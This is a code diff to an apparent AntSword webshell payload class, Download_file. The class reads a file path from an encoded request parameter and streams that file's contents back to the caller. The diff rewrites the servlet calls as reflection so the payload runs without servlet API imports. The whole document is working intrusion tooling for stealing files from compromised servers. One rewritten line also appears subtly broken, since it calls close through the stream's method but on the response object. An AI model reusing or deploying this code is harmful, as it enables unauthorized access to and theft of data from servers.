@@ -1,15 +1,13 @@
 package filemanager;
 
-import javax.servlet.ServletOutputStream;
-import javax.servlet.http.HttpServletRequest;
-import javax.servlet.http.HttpServletResponse;
 import java.io.BufferedInputStream;
 import java.io.FileInputStream;
 import java.lang.reflect.Field;
+import java.lang.reflect.Method;
 
 public class Download_file {
-    public HttpServletRequest request = null;
-    public HttpServletResponse response = null;
+    public Object request = null;
+    public Object response = null;
     public String encoder = "base64";
     public String cs = "antswordCharset";
     public String randomPrefix = "antswordrandomPrefix";
@@ -24,16 +22,17 @@ public class Download_file {
         tag_e = "|<-";
         String varkey1 = "antswordargpath";
         try {
-            response.setContentType("text/html");
-            request.setCharacterEncoding(cs);
-            response.setCharacterEncoding(cs);
-            String z1 = decode(request.getParameter(varkey1));
-            DownloadFileCode(z1, response);
+            response.getClass().getMethod("setContentType", String.class).invoke(response, "text/html");
+            request.getClass().getMethod("setCharacterEncoding", String.class).invoke(request, cs);
+            response.getClass().getMethod("setCharacterEncoding", String.class).invoke(response, cs);
+            String z1 = decode((String) request.getClass().getMethod("getParameter", String.class).invoke(request, varkey1));
+            DownloadFileCode(z1);
         } catch (Exception e) {
-            output.append("ERROR:// " + e.toString());
+            output.append("ERROR:// " + e);
         }
         try {
-            response.getWriter().print(tag_s + output.toString() + tag_e);
+            Object writer = response.getClass().getMethod("getWriter").invoke(response);
+            writer.getClass().getMethod("print", String.class).invoke(writer, tag_s + output + tag_e);
         } catch (Exception ignored) {
         }
         return true;
@@ -42,29 +41,26 @@ public class Download_file {
     public void parseObj(Object obj) {
         if (obj.getClass().isArray()) {
             Object[] data = (Object[]) obj;
-            request = (HttpServletRequest) data[0];
-            response = (HttpServletResponse) data[1];
+            request = data[0];
+            response = data[1];
         } else {
             try {
-                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
-                request = (HttpServletRequest) clazz.getDeclaredMethod("getRequest").invoke(obj);
-                response = (HttpServletResponse) clazz.getDeclaredMethod("getResponse").invoke(obj);
+                request = obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
+                response = obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
             } catch (Exception e) {
-                if (obj instanceof HttpServletRequest) {
-                    request = (HttpServletRequest) obj;
+                request = obj;
+                try {
+                    Field req = request.getClass().getDeclaredField("request");
+                    req.setAccessible(true);
+                    Object request2 = req.get(request);
+                    Field resp = request2.getClass().getDeclaredField("response");
+                    resp.setAccessible(true);
+                    response = resp.get(request2);
+                } catch (Exception ex) {
                     try {
-                        Field req = request.getClass().getDeclaredField("request");
-                        req.setAccessible(true);
-                        HttpServletRequest request2 = (HttpServletRequest) req.get(request);
-                        Field resp = request2.getClass().getDeclaredField("response");
-                        resp.setAccessible(true);
-                        response = (HttpServletResponse) resp.get(request2);
-                    } catch (Exception ex) {
-                        try {
-                            response = (HttpServletResponse) request.getClass().getDeclaredMethod("getResponse").invoke(obj);
-                        } catch (Exception ignored) {
+                        response = request.getClass().getDeclaredMethod("getResponse").invoke(obj);
+                    } catch (Exception ignored) {
 
-                        }
                     }
                 }
             }
@@ -94,18 +90,20 @@ public class Download_file {
         return str;
     }
 
-    void DownloadFileCode(String filePath, HttpServletResponse r) throws Exception {
+    void DownloadFileCode(String filePath) throws Exception {
         int n;
         byte[] b = new byte[512];
-        r.reset();
-        ServletOutputStream os = r.getOutputStream();
+        response.getClass().getMethod("reset").invoke(response);
+        Object os = response.getClass().getMethod("getOutputStream").invoke(response);
         BufferedInputStream is = new BufferedInputStream(new FileInputStream(filePath));
-        os.write(tag_s.getBytes());
+        Method write = os.getClass().getMethod("write", byte[].class);
+        Method write2 = os.getClass().getMethod("write", byte[].class, int.class, int.class);
+        write.invoke(os, tag_s.getBytes());
         while ((n = is.read(b, 0, 512)) != -1) {
-            os.write(b, 0, n);
+            write2.invoke(os, b, 0, n);
         }
-        os.write(tag_e.getBytes());
-        os.close();
+        write.invoke(os, tag_e.getBytes());
+        os.getClass().getMethod("close").invoke(response);
         is.close();
     }
 }
